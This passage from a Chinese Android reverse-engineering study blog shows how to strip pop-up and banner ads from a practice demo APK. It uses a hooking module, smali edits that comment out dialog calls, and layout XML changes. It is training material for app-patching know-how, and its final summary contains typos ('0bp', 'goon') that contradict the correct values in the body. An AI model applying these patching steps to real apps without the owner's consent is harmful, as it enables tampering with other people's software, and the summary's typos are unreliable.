<p>我的算法助手中没有应用总开关这个选项，我就只勾选了弹窗定位（返回键可取消），但是还是可以绕过这个弹窗广告的，也就是说返回键是可以用的，可能是新版本布局不太一样？</p>
<p><strong>方法二：</strong></p>
<p>同样使用算法助手勾选屏蔽关键词弹窗，填写<code>广告</code>（弹窗中的关键词）</p>
<p>ok，没有了</p>
<p><mark><strong>修改dex弹窗代码</strong></mark></p>
<p>算法助手中还是选择弹窗定位，右上角开始。</p>
<p>查看算法助手中的日志，点击我们的apk文件，选择一号弹窗</p>
<p>在日志中</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">at LSPHooker_<span class="selector-class">.show</span>(Unknown Source:<span class="number">8</span>)</span><br><span class="line">at com<span class="selector-class">.zj</span><span class="selector-class">.wuaipojie</span><span class="selector-class">.ui</span><span class="selector-class">.ChallengeThird</span><span class="selector-class">.onCreate</span>(ChallengeThird<span class="selector-class">.kt</span>:<span class="number">53</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>LSPHooker_.show</code></strong>：这是算法助手拦截到的弹窗显示动作，它是“结果”，不用管它。</p>
</li>
<li><p><strong><code>com.zj.wuaipojie.ui.ChallengeThird.onCreate</code></strong>：这是关键！它告诉我们：在 <code>ChallengeThird</code> 这个界面的 <code>onCreate</code>（创建界面）方法中，触发了弹窗。</p>
</li>
</ul>
<p>在MT管理器中搜索<code>com.zj.wuaipojie.ui.ChallengeThird.onCreate</code></p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/6.png" class="" title="This is an image">

<p>找到两个show方法将它们注释掉</p>
<ul>
<li><p>在算法助手中，日志<code>at com.zj.wuaipojie.ui.ChallengeThird.onCreate(ChallengeThird.kt:53)</code>后面的<code>kt: 53</code>对应的就是代码中的<code>.line 53</code></p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/7.png" class="" title="This is an image">
</li>
<li><p><strong>原理：</strong> 编译器在把 Java&#x2F;Kotlin 转成 Smali 时，会保留原始代码的行号。算法助手抓取的是运行时的行号。</p>
</li>
</ul>
<p>到这里突然我想到了一个问题：算法助手这个软件是不是只对LSPosed开发的文件管用？？</p>
<p>不是的。算法助手并不只对 LSPosed 开发的文件管用，，可以对绝大多数安卓应用生效。</p>
<h4 id="横幅广告"><a href="#横幅广告" class="headerlink" title="横幅广告"></a>横幅广告</h4><p><mark><strong>方法一</strong></mark></p>
<p>下载开发助手，点击布局查看</p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/8.png" class="" title="This is an image">

<p>id是<code>0x7f0801ca</code>，在MT管理器中点击xml搜索，搜索该id</p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/9.png" class="" title="This is an image">

<p>将150dp改成0dp（可以只改宽度或高度或者都改）</p>
<p>这样广告就去掉了</p>
<p><mark><strong>方法二</strong></mark></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:id</span>=<span class="string">&quot;@7F0801CA&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:background</span>=<span class="string">&quot;@7F0D0017&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_width</span>=<span class="string">&quot;-2&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">android:visibility</span>=<span class="string">&quot;gone&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_height</span>=<span class="string">&quot;150dp&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:layout_marginTop</span>=<span class="string">&quot;100dp&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>android:visibility=&quot;gone&quot;</code>几乎是安卓逆向和开发中隐藏的UI元素黄金准则。</p>
<ol>
<li><strong><code>android:visibility</code> 的三个选项</strong></li>
</ol>
<p>在安卓中，一个控件的“可见性”有三种状态：</p>
<table>
<thead>
<tr>
<th><strong>状态</strong></th>
<th><strong>表现</strong></th>
<th><strong>占用空间</strong></th>
<th><strong>你的需求</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>visible</strong></td>
<td>正常显示</td>
<td>是</td>
<td>默认状态</td>
</tr>
<tr>
<td><strong>invisible</strong></td>
<td>隐身（看不见）</td>
<td><strong>是</strong></td>
<td>依然留下一块大空白</td>
</tr>
<tr>
<td><strong>gone</strong></td>
<td><strong>彻底消失</strong></td>
<td><strong>否</strong></td>
<td><strong>完美去广告且不留空白</strong></td>
</tr>
</tbody></table>
<ol start="2">
<li><strong>为什么要加<code>gone</code>?作用是什么？</strong></li>
</ol>
<ul>
<li><p><strong>不参与布局计算：</strong> 当你设置成 <code>gone</code> 时，安卓系统在绘制界面时会直接“无视”这个控件。它不仅看不见，原本属于它的位置会被其他控件挤上来占掉。</p>
</li>
<li><p><strong>比改 <code>0dp</code> 更稳：</strong> 如果改宽高为 <code>0dp</code>，控件虽然没大小，但它设置的 <code>margin</code>（外边距，比如你代码里的 <code>android:layout_marginTop=&quot;100dp&quot;</code>）可能依然会生效，导致界面留下莫名其妙的间隙。</p>
</li>
</ul>
<ul>
<li><code>gone</code> 会连同这个控件的 <code>margin</code> 效果一起抹去。</li>
</ul>
<ol start="3">
<li><strong>为什么加在宽高中间？</strong></li>
</ol>
<p>其实，加在xml标签内的任何位置都是可以的，只要它是一个独立的属性。加在宽高之间，通常是为了：</p>
<ul>
<li><p><strong>方便管理：</strong> 宽高定义了“大小”，<code>visibility</code> 定义了“显隐”，放在一起逻辑上比较直观。</p>
</li>
<li><p><strong>快速定位：</strong> 以后你再回来修改这个文件，一眼就能看到这个控件的大小被你通过 <code>gone</code> 给“屏蔽”了。</p>
</li>
</ul>
<h3 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a><a href="#3">课后作业</a></h3><img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/10.png" class="" title="This is an image">

<p>我们要做的就是将这个弹窗广告去除（返回键被劫持），由于这和版本并没有什么关系，所以我们不能去修改versionCode来去除这个弹窗，这里有几种方法：</p>
<ol>
<li>使用算法助手，恢复返回键。</li>
<li>使用算法助手，屏蔽带有<code>弹窗</code>字样的弹窗。</li>
<li>修改xml代码，将show注释掉。</li>
</ol>
<p><strong>方法一：</strong></p>
<p>**注：**因为这个apk文件是新下载的，所以需要在LSPosed中重新勾选作业demo。</p>
<p>打开算法助手，点击作业demo，勾选弹窗定位（返回键可取消），点击右上角，弹窗启动之后，直接点击返回键就可以了。</p>
<p>这种方法其实并没有将弹窗去除，而是恢复被劫持的返回键，当弹窗弹出时，使用返回键关闭弹窗。</p>
<p><strong>方法二：</strong></p>
<p>同样使用算法助手，打开<code>屏蔽关键词弹窗</code>，输入<code>弹窗</code>，点击右上角，弹窗被关闭了。</p>
<p><strong>方法三：</strong></p>
<p>使用算法助手，打开弹窗定位，点击右上角，弹窗弹出之后，回到算法助手。</p>
<p>打开算法助手的日志</p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/11.png" class="" title="This is an image">

<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/12.png" class="" title="This is an image">

<p>可以看到<code>com.zj.wuaipojie.ui.MainActivity.onCreate</code>，大概率该弹窗就是在这个方法中，我们去MT管理器中搜索该方法</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.method</span><span class="keyword"> protected</span> onCreate(<span class="class">Landroid/os/Bundle;</span>)V</span><br><span class="line"><span class="keyword">    .registers</span> 9</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static/range </span>&#123;p0 .. p0&#125;, <span class="class">Lnp/֏;</span>-&gt;ށ(<span class="class">Landroid/app/Activity;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 28</span><br><span class="line">   <span class="built_in"> invoke-super </span>&#123;p0, p1&#125;, <span class="class">Landroidx/appcompat/app/AppCompatActivity;</span>-&gt;onCreate(<span class="class">Landroid/os/Bundle;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 30</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0&#125;, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity;</span>-&gt;getLayoutInflater()<span class="class">Landroid/view/LayoutInflater;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>p1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;p1&#125;, <span class="class">Lcom/zj/wuaipojie/databinding/ActivityMainBinding;</span>-&gt;inflate(<span class="class">Landroid/view/LayoutInflater;</span>)<span class="class">Lcom/zj/wuaipojie/databinding/ActivityMainBinding;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>p1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-object </span>p1, p0, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity;</span>-&gt;binding:<span class="class">Lcom/zj/wuaipojie/databinding/ActivityMainBinding;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">&quot;binding&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v1, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-nez </span>p1,<span class="keyword"> :cond_19</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 31</span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0&#125;, <span class="class">Lkotlin/jvm/internal/Intrinsics;</span>-&gt;throwUninitializedPropertyAccessException(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-object </span>p1, v1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :cond_19</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1&#125;, <span class="class">Lcom/zj/wuaipojie/databinding/ActivityMainBinding;</span>-&gt;getRoot()<span class="class">Landroidx/constraintlayout/widget/ConstraintLayout;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>p1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>p1, <span class="class">Landroid/view/View;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0, p1&#125;, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity;</span>-&gt;setContentView(<span class="class">Landroid/view/View;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 33</span><br><span class="line">   <span class="built_in"> iget-object </span>p1, p0, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity;</span>-&gt;binding:<span class="class">Lcom/zj/wuaipojie/databinding/ActivityMainBinding;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-nez </span>p1,<span class="keyword"> :cond_2a</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0&#125;, <span class="class">Lkotlin/jvm/internal/Intrinsics;</span>-&gt;throwUninitializedPropertyAccessException(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-object </span>p1, v1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :cond_2a</span></span><br><span class="line">   <span class="built_in"> iget-object </span>p1, p1, <span class="class">Lcom/zj/wuaipojie/databinding/ActivityMainBinding;</span>-&gt;navView:<span class="class">Lcom/google/android/material/bottomnavigation/BottomNavigationView;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 35</span><br><span class="line">   <span class="built_in"> move-object </span>v0, p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>v0, <span class="class">Landroid/app/Activity;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>v2, 0x7f080132</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v0, v2&#125;, <span class="class">Landroidx/navigation/ActivityKt;</span>-&gt;findNavController(<span class="class">Landroid/app/Activity;</span>I)<span class="class">Landroidx/navigation/NavController;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> new-array </span>v2, v2, [<span class="class">Ljava/lang/Integer;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>v3, 0x7f08013c</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 38</span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v3&#125;, <span class="class">Ljava/lang/Integer;</span>-&gt;valueOf(I)<span class="class">Ljava/lang/Integer;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v4, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> aput-object </span>v3, v2, v4</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>v3, 0x7f08013a</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v3&#125;, <span class="class">Ljava/lang/Integer;</span>-&gt;valueOf(I)<span class="class">Ljava/lang/Integer;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v5, 0x1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> aput-object </span>v3, v2, v5</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const/4 </span>v3, 0x2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const </span>v6, 0x7f080135</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v6&#125;, <span class="class">Ljava/lang/Integer;</span>-&gt;valueOf(I)<span class="class">Ljava/lang/Integer;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v6</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> aput-object </span>v6, v2, v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 37</span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2&#125;, <span class="class">Lkotlin/collections/SetsKt;</span>-&gt;setOf([<span class="class">Ljava/lang/Object;</span>)<span class="class">Ljava/util/Set;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 96</span><br><span class="line">   <span class="built_in"> move-object </span>v3, v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>v3, <span class="class">Landroidx/customview/widget/Openable;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 97</span><br><span class="line">   <span class="built_in"> sget-object </span>v3, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity$onCreate$$inlined$AppBarConfiguration$default$1;</span>-&gt;INSTANCE:<span class="class">Lcom/zj/wuaipojie/ui/MainActivity$onCreate$$inlined$AppBarConfiguration$default$1;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>v3, <span class="class">Lkotlin/jvm/functions/Function0;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 98</span><br><span class="line">   <span class="built_in"> new-instance </span>v6, <span class="class">Landroidx/navigation/ui/AppBarConfiguration$Builder;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v6, v2&#125;, <span class="class">Landroidx/navigation/ui/AppBarConfiguration$Builder;</span>-&gt;&lt;init&gt;(<span class="class">Ljava/util/Set;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 99</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v6, v1&#125;, <span class="class">Landroidx/navigation/ui/AppBarConfiguration$Builder;</span>-&gt;setOpenableLayout(<span class="class">Landroidx/customview/widget/Openable;</span>)<span class="class">Landroidx/navigation/ui/AppBarConfiguration$Builder;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 100</span><br><span class="line">   <span class="built_in"> new-instance </span>v2, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity$inlined$sam$i$androidx_navigation_ui_AppBarConfiguration_OnNavigateUpListener$0;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v2, v3&#125;, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity$inlined$sam$i$androidx_navigation_ui_AppBarConfiguration_OnNavigateUpListener$0;</span>-&gt;&lt;init&gt;(<span class="class">Lkotlin/jvm/functions/Function0;</span>)V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>v2, <span class="class">Landroidx/navigation/ui/AppBarConfiguration$OnNavigateUpListener;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Landroidx/navigation/ui/AppBarConfiguration$Builder;</span>-&gt;setFallbackOnNavigateUpListener(<span class="class">Landroidx/navigation/ui/AppBarConfiguration$OnNavigateUpListener;</span>)<span class="class">Landroidx/navigation/ui/AppBarConfiguration$Builder;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 101</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="class">Landroidx/navigation/ui/AppBarConfiguration$Builder;</span>-&gt;build()<span class="class">Landroidx/navigation/ui/AppBarConfiguration;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v2, <span class="string">&quot;AppBarConfiguration.Buil…eUpListener)\n    .build()&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v1, v2&#125;, <span class="class">Lkotlin/jvm/internal/Intrinsics;</span>-&gt;checkExpressionValueIsNotNull(<span class="class">Ljava/lang/Object;</span><span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 41</span><br><span class="line">   <span class="built_in"> move-object </span>v2, p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>v2, <span class="class">Landroidx/appcompat/app/AppCompatActivity;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v0, v1&#125;, <span class="class">Landroidx/navigation/ui/ActivityKt;</span>-&gt;setupActionBarWithNavController(<span class="class">Landroidx/appcompat/app/AppCompatActivity;</span><span class="class">Landroidx/navigation/NavController;</span><span class="class">Landroidx/navigation/ui/AppBarConfiguration;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 42</span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;p1, v0&#125;, <span class="class">Landroidx/navigation/ui/BottomNavigationViewKt;</span>-&gt;setupWithNavController(<span class="class">Lcom/google/android/material/bottomnavigation/BottomNavigationView;</span><span class="class">Landroidx/navigation/NavController;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 45</span><br><span class="line">   <span class="built_in"> sget-object </span>p1, <span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span>-&gt;INSTANCE:<span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-object </span>v0, p0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> check-cast </span>v0, <span class="class">Landroid/content/Context;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v1, <span class="string">&quot;FIRST_START&quot;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1, v0, v1, v5&#125;, <span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span>-&gt;getBoolean(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/String;</span>Z)Z</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result </span>p1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> if-ne </span>p1, v5,<span class="keyword"> :cond_9d</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 47</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p0&#125;, <span class="class">Lcom/zj/wuaipojie/ui/MainActivity;</span>-&gt;alertFirst()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 48</span><br><span class="line">   <span class="built_in"> sget-object </span>p1, <span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span>-&gt;INSTANCE:<span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1, v0, v1, v4&#125;, <span class="class">Lcom/zj/wuaipojie/util/SPUtils;</span>-&gt;saveBoolean(<span class="class">Landroid/content/Context;</span><span class="class">Ljava/lang/String;</span>Z)V</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :cond_9d</span></span><br><span class="line">   <span class="built_in"> return-void</span></span><br><span class="line"><span class="built_in"></span><span class="keyword">.end method</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是该方法的所有代码，可以发现我们并找不到show方法，这里我还有一个问题：</p>
<p><strong>Q:</strong> 之前看日志的时候，后面有一个数字，比如这篇文章中讲的弹窗，他后面会跟<code>kt: 53</code>，那我们就知道show方法是在line : 53，但是这个日志中却没有，这是为什么。</p>
<p><strong>A:</strong> 在安卓编译过程中，存在一个叫做 <strong>Line Number Table（行号表）</strong> 的东西。</p>
<ul>
<li><strong>有行号时（如之前的 <code>ChallengeThird</code>）：</strong> 开发者在编译 APK 时，保留了原始源文件（Kotlin&#x2F;Java）与编译后的字节码（Smali）之间的对应关系。算法助手能读取到这个表，所以能精确告诉你“这是第 53 行”。</li>
<li><strong>没行号时（当前的 <code>MainActivity</code>）：</strong> 开发者开启了<strong>混淆（ProGuard&#x2F;R8）</strong>，并配置了类似 <code> -del_sourceinfo</code> 的指令。编译工具会把所有的行号表删掉，以减小 APK 体积并增加逆向难度。<ul>
<li><strong>Unknown Source</strong>：意味着类名对应的原始文件名（如 <code>MainActivity.kt</code>）被删除了。</li>
<li><strong>数字 0</strong>：意味着行号信息彻底没了，系统只知道在运行这个方法，但不知道是哪一行。</li>
</ul>
</li>
</ul>
<p>言归正传，既然找不到show，那我们接下来怎么做？</p>
<p>在日志中我们看到</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line">at android.app.AlertDialog$Builder.show(AlertDialog.java:1125)</span><br><span class="line">at np.֏.ށ(Unknown Source:38)</span><br><span class="line">at com.zj.wuaipojie.ui.MainActivity.onCreate(Unknown Source:0)</span><br></pre></td></tr></table></figure>

<p>调用完<code>ށ</code>这个方法之后，调用了show方法，这说明：<strong>弹窗的动作，就是在这个 <code>ށ</code> 方法里被触发的。</strong></p>
<p>所以我们可以直接将ށ注释掉，没有这个方法，那么就调用不了show了</p>
<img src="/2026/02/12/Android%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%83)/13.png" class="" title="This is an image">

<p>保存安装看看弹窗还有没有了，发现我们成功了。</p>
<p>在写作业时，我本来想注释掉<code>invoke-virtual &#123;p0&#125;, Lcom/zj/wuaipojie/ui/MainActivity;-&gt;alertFirst()V</code>这一行，因为我们知道有时候<code>alert</code>也是弹窗的意思，但是并没有用，这就是逆向中的“对抗”。开发者会故意写好几个弹窗方法，有的叫 <code>alert</code>，有的叫 <code>check</code>，有的用乱码命名。 <strong>不要被方法的名字迷惑，要相信日志里的堆栈信息。</strong> 日志指哪，你就打哪。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><a href="#4">总结</a></h3><p><strong>启动广告：</strong></p>
<ol>
<li>使用MT管理器中的Activity记录，得到启动广告在哪一个方法中，修改时间</li>
<li>将程序的入口页面换成程序页面，跳过广告（不建议使用）</li>
<li>找到哪里调用了该启动广告，修改程序逻辑</li>
</ol>
<p><strong>弹窗广告：</strong></p>
<ol>
<li>如果是更新之类的广告，在xml文件中修改versionCode</li>
<li>使用算法助手，恢复被劫持的返回键</li>
<li>使用算法助手，屏蔽带有关键词的弹窗</li>
<li>查看日志，找到调用该广告的方法，注释掉show</li>
</ol>
<p><strong>横幅广告：</strong></p>
<ol>
<li>使用开发助手，获得广告的id，在xml文件中修改广告的宽高为0bp</li>
<li>在文件的宽高之间加上<code>android:visibility=&quot;goon&quot;</code></li>
</ol>
]]></content>
      <tags>
        <tag>安卓逆向</tag>
      </tags>
  </entry>
</search>
